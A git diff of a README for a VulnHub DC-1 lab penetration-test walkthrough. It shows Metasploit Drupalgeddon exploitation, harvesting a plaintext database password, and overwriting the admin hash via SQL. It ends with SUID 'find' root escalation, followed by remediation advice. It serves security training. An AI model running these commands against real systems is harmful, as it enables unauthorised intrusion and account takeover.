@@ -1,109 +1,207 @@
-# DC-1 Security Assessment
+# DC-1 Security Assessment & Penetration Testing Walkthrough
 
-> An end-to-end security assessment and penetration testing walkthrough of the **DC-1** vulnerable machine from VulnHub, performed inside an isolated virtual lab.
+> An end-to-end black-box penetration testing and security assessment of the **DC-1** vulnerable machine (VulnHub), executed inside an isolated virtual lab environment.
 
-![Assessment workflow](screenshots/03-network-scan.png)
+---
 
-## Table of Contents
+## Executive Summary
 
-- [Lab Overview](#lab-overview)
-- [Assessment Workflow](#assessment-workflow)
-- [Key Findings](#key-findings)
-- [Evidence](#evidence)
-- [Hardening Recommendations](#hardening-recommendations)
+This assessment simulates a realistic internal penetration test against an enterprise asset running legacy Linux and an unpatched content management system (Drupal 7). The entire kill-chain was demonstrated:
 
-## Lab Overview
+1. **Reconnaissance & Discovery:** Network host identification, port scanning, and service version enumeration.
+2. **Network Traffic Sniffing:** Clear-text protocol analysis via Wireshark exposing sensitive web parameters.
+3. **Exploitation & Initial Foothold:** Remote Code Execution (RCE) via Drupalgeddon (CVE-2014-3704) using Metasploit.
+4. **Post-Exploitation & Credential Harvesting:** Extracting backend database credentials and overwriting the Drupal administrator hash via MySQL.
+5. **Privilege Escalation:** SUID binary abuse on `/usr/bin/find` to elevate privileges from low-privilege `www-data` to full `root`.
 
-| Component | Details                             |
-| --------- | ----------------------------------- |
-| Target    | DC-1, Debian GNU/Linux 7            |
-| Attacker  | Kali Linux                          |
-| Network   | Isolated NAT Network: `Midterm_Net` |
-| Subnet    | `10.0.2.0/24`                       |
-| Target IP | `10.0.2.6`                          |
+---
 
-![Target setup](screenshots/01-target-setup.png)
-![Isolated NAT network](screenshots/02-nat-network.png)
+## Lab Architecture & Environment
 
-## Assessment Workflow
+| Component | Specification |
+| :--- | :--- |
+| **Target Machine** | DC-1 (Debian GNU/Linux 7 Wheezy) |
+| **Attacker Machine** | Kali Linux (`10.0.2.4`) |
+| **Virtualizer** | Oracle VM VirtualBox |
+| **Network Type** | Isolated Custom NAT Network (`Midterm_Net`) |
+| **Target Subnet** | `10.0.2.0/24` |
+| **Target IP** | `10.0.2.6` |
 
-### 1. Reconnaissance and Service Discovery
+---
 
-The target IP was identified with `arp-scan`, followed by full TCP port and service enumeration.
+## Penetration Testing Workflow
+
+### Phase 1: Reconnaissance & Enumeration
+
+#### 1. Network Discovery
+
+Local network scanning identified the live host inside the subnet:
+
+```bash
+sudo arp-scan -l
+```
+
+#### 2. Service & Port Scanning
+
+A full TCP port and service scan was executed using Nmap:
 
 ```bash
 nmap -sC -sV -p- 10.0.2.6
 ```
 
-![Network scan](screenshots/03-network-scan.png)
-![Nmap discovery](screenshots/04-nmap-discovery.png)
+**Key Open Ports:**
+- `22/tcp`: OpenSSH 6.0p1 (Debian 4+deb7u7)
+- `80/tcp`: Apache httpd 2.2.22 (Debian) running Drupal 7
+- `111/tcp`: rpcbind 2-4
 
-### 2. Traffic Analysis
+---
 
-HTTP traffic was captured and reviewed in Wireshark. Because the application did not use encryption, form parameters and session headers were visible in clear text. Authentication-related HTTP POST requests exposed internal request data.
+### Phase 2: Traffic Analysis (Clear-Text Exposure)
 
-![Wireshark traffic capture](screenshots/05-wireshark-sniffing.png)
+Passive packet capture using Wireshark on interface `eth0` confirmed all web interactions with `10.0.2.6` used unencrypted HTTP (port 80).
 
-### 3. Initial Access: Drupalgeddon
-
-The host was running an outdated Drupal 7 installation vulnerable to remote code execution. Successful exploitation provided an initial shell in the context of `www-data`.
-
-### 4. Credential Harvesting
-
-Drupal database credentials were found in:
-
-```text
-/var/www/sites/default/settings.php
+```bash
+sudo wireshark
 ```
 
-The database user was `dbuser`. Drupal user password hashes were then queried from the database:
+**Observation:** HTTP POST transactions revealed form variables, session headers, and authentication parameters without any transport layer security.
+
+---
+
+### Phase 3: Initial Foothold (Drupalgeddon - CVE-2014-3704)
+
+The target CMS was identified as an unpatched Drupal 7.x installation susceptible to SQL injection and subsequent arbitrary PHP execution via the Drupalgeddon exploit.
+
+**Metasploit Execution:**
+
+```bash
+msfconsole
+use exploit/multi/http/drupal_drupageddon
+set RHOSTS 10.0.2.6
+set RPORT 80
+exploit
+```
+
+A reverse shell was established under the low-privilege service account:
+
+```bash
+shell
+whoami
+# Output: www-data
+id
+# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+---
+
+### Phase 4: Database Dumping & Password Manipulation
+
+#### 1. Configuration Review
+
+Inspection of the Drupal site configuration files exposed plaintext database credentials:
+
+```bash
+cd /var/www
+cat sites/default/settings.php
+```
+
+- **Database User:** `dbuser`
+- **Database Password:** `R0ck3t`
+- **Database Name:** `drupaldb`
+
+#### 2. Extracting User Hashes
+
+Querying the MySQL backend revealed registered application users and their salted hashes:
 
 ```bash
 mysql -u dbuser -pR0ck3t -e "use drupaldb; select name, pass from users;"
 ```
 
-![Database credentials](screenshots/06-database-credentials.png)
-![Extracted password hashes](screenshots/07-extracted-hashes.png)
+#### 3. Overwriting the Admin Password
 
-### 5. Privilege Escalation
+Because Drupal 7 hashes are salted and computationally intensive to crack, Drupal's internal password-hashing script was utilized to generate a known hash and overwrite the admin password:
 
-SUID enumeration exposed a misconfigured copy of `/usr/bin/find`:
+```bash
+php scripts/password-hash.sh password
+# Output Hash: $S$DhNsEVUad71u8s3HhOJKGA8KVO3eW2Y108I3T/RANiBdw4Ims8YR
+```
+
+The database was updated directly via MySQL:
+
+```sql
+mysql -u dbuser -p -D drupaldb
+Enter password: R0ck3t
+
+UPDATE users SET pass='$S$DhNsEVUad71u8s3HhOJKGA8KVO3eW2Y108I3T/RANiBdw4Ims8YR' WHERE name='admin';
+exit;
+```
+
+**Result:** Administrative access to the Drupal web console (`http://10.0.2.6`) was obtained using the credentials `admin:password`.
+
+---
+
+### Phase 5: Local Privilege Escalation (Root Access)
+
+#### 1. SUID Binary Enumeration
+
+Searching for binaries configured with the SUID bit set:
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Because the binary retained its SUID bit, it could be abused to spawn a privileged shell:
+Among standard utilities, `/usr/bin/find` was identified with administrative permissions retained.
+
+#### 2. SUID Exploitation via GTFOBins
+
+The `-exec` directive of the SUID `find` binary was abused to execute a privileged sub-shell:
 
 ```bash
 find . -exec /bin/bash -p \; -quit
 ```
 
-![Privilege escalation](screenshots/08-privilege-escalation.png)
+Verification of elevated privileges:
 
-## Key Findings
+```bash
+whoami
+# Output: root
+id
+# Output: uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
+```
 
-| Port      | Service                    | Observation                                         | Impact                                            |
-| --------- | -------------------------- | --------------------------------------------------- | ------------------------------------------------- |
-| `22/tcp`  | OpenSSH `6.0p1`            | Remote shell service exposed                        | Increased attack surface                          |
-| `80/tcp`  | Apache `2.2.22` / Drupal 7 | Deprecated web stack with known vulnerabilities     | Remote code execution and initial access          |
-| `111/tcp` | `rpcbind`                  | RPC service exposed                                 | Additional service enumeration and attack surface |
-| HTTP      | Unencrypted web traffic    | Form data and session headers visible in clear text | Credential and session exposure                   |
-| SUID      | `/usr/bin/find`            | Unnecessary SUID permission retained                | Privilege escalation to root                      |
+---
 
-## Hardening Recommendations
+## Vulnerability & Risk Matrix
 
-- **Patch management:** Upgrade Drupal and Apache to supported releases, or migrate away from deprecated Drupal 7.
-- **Transport encryption:** Enforce HTTPS/TLS for every web request and redirect HTTP traffic to HTTPS.
-- **Credential protection:** Rotate exposed database credentials and store secrets outside web-accessible configuration paths.
-- **SUID audit:** Remove the unnecessary SUID bit from `find`:
+| Finding | Vulnerability | Severity | Impact |
+| :--- | :--- | :--- | :--- |
+| Drupal 7 CMS | CVE-2014-3704 (Drupalgeddon) | Critical (9.8) | Remote Code Execution & unauthenticated initial access |
+| SUID `/usr/bin/find` | Misconfigured file permissions | High (8.4) | Local privilege escalation directly to root |
+| HTTP (Clear-Text) | Lack of Transport Layer Security | Medium (5.3) | Credential sniffing and session hijacking |
+| World-Readable Configs | Insecure permissions on `settings.php` | Medium (5.5) | Plaintext credential harvesting of backend database |
 
-  ```bash
-  chmod u-s /usr/bin/find
-  ```
+---
 
-- **Network reduction:** Disable unused services and restrict SSH, RPC, and administrative interfaces to trusted management hosts.
+## Remediation & Hardening Roadmap
 
-## Assessment Scope
+1. **Patching & CMS Lifecycle**
+   Upgrade Drupal to the latest stable release or migrate off end-of-life Drupal 7 installations.
 
-This assessment was performed only against the intentionally vulnerable DC-1 machine inside an isolated lab network. The techniques and commands documented here should be used only on systems where explicit authorization has been granted.
+2. **Access Control & SUID Stripping**
+   Strip unnecessary SUID permissions from binary utilities:
+   ```bash
+   chmod u-s /usr/bin/find
+   ```
+
+3. **Transport Security**
+   Enforce HTTPS using TLS 1.3 across the entire web interface and disable HTTP port 80 or redirect strictly to port 443.
+
+4. **Least-Privilege Database & File Permissions**
+   - Restrict access to `settings.php` to strictly administrative root accounts (`chmod 600 sites/default/settings.php`).
+   - Limit the database account permissions so `dbuser` cannot arbitrarily execute destructive `UPDATE` statements on core tables from the web context.
+
+---
+
+## Disclaimer
+
+This security assessment was executed strictly within an isolated, private virtual laboratory for educational and evaluation purposes. All penetration testing techniques followed proper authorization protocols.
